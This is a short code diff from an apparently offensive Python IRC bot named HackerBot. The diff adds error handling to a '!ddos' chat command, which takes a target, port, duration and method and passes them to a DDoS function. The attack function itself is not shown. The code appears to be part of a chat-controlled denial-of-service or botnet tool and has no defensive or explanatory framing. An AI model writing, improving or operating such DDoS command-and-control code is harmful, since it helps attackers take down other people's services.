@@ -37,12 +37,15 @@ class HackerBot(irc.IRCClient):
                 return
 
         if msg.startswith("!ddos"):
-            args = msg.split(" ")
-            target = args[1]
-            port = args[2]
-            time = args[3]
-            method = args[4].upper()
-            self.msg(channel, commands.ddos(target, port, time, method))
+            try:
+                args = msg.split(" ")
+                target = args[1]
+                port = args[2]
+                time = args[3]
+                method = args[4].upper()
+                self.msg(channel, commands.ddos(target, port, time, method))
+            except:
+                self.msg(channel, "[!] Failed to send attacak")
 
         for url in re.findall(r"https?://.*/.*\b", msg):
             try:
